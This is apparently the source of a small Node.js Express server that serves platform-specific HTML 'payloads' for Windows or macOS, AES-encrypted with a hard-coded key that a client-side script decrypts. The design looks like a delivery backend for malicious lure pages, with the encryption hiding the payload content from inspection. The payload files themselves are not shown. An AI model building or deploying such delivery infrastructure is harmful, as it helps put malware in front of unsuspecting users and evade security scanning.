const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const CryptoJS = require('crypto-js');

const app = express();
const PORT = process.env.PORT || 3000;

// Enable CORS — frontend runs on a different origin
app.use(cors());

// Load HTML payload templates from separate files
let winHtml, macHtml;

try {
    winHtml = fs.readFileSync(path.join(__dirname, 'payload-win.html'), 'utf8');
    console.log('[✓] Loaded payload-win.html');
} catch (err) {
    console.error('[✗] Failed to load payload-win.html:', err.message);
    winHtml = '<h1>Windows Payload Placeholder</h1><p>Error loading template.</p>';
}

try {
    macHtml = fs.readFileSync(path.join(__dirname, 'payload-mac.html'), 'utf8');
    console.log('[✓] Loaded payload-mac.html');
} catch (err) {
    console.error('[✗] Failed to load payload-mac.html:', err.message);
    macHtml = '<h1>macOS Payload Placeholder</h1><p>Error loading template.</p>';
}

// Encryption key matching the client-side decryption logic
const PAYLOAD_ENCRYPTION_KEY = '98yNCjeAfWMwk0wI';

// API endpoint returning encrypted payload
app.get('/data', (req, res) => {
    const platform = req.query.platform || 'win';

    let rawHtml;
    if (platform === 'mac') {
        rawHtml = macHtml;
        console.log(`[ℹ] Serving macOS payload`);
    } else {
        rawHtml = winHtml;
        console.log(`[ℹ] Serving Windows payload`);
    }

    try {
        const ciphertext = CryptoJS.AES.encrypt(rawHtml, PAYLOAD_ENCRYPTION_KEY).toString();
        res.json({ cipher: ciphertext });
    } catch (err) {
        console.error('[✗] Encryption error:', err.message);
        res.status(500).json({ error: 'Encryption failed' });
    }
});

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'ok', uptime: process.uptime() });
});

app.listen(PORT, 'localhost', () => {
    console.log(`[✓] Backend API server running on http://localhost:${PORT}`);
    console.log(`[ℹ] Endpoint: GET /api/v1/data?platform=win|mac`);
});
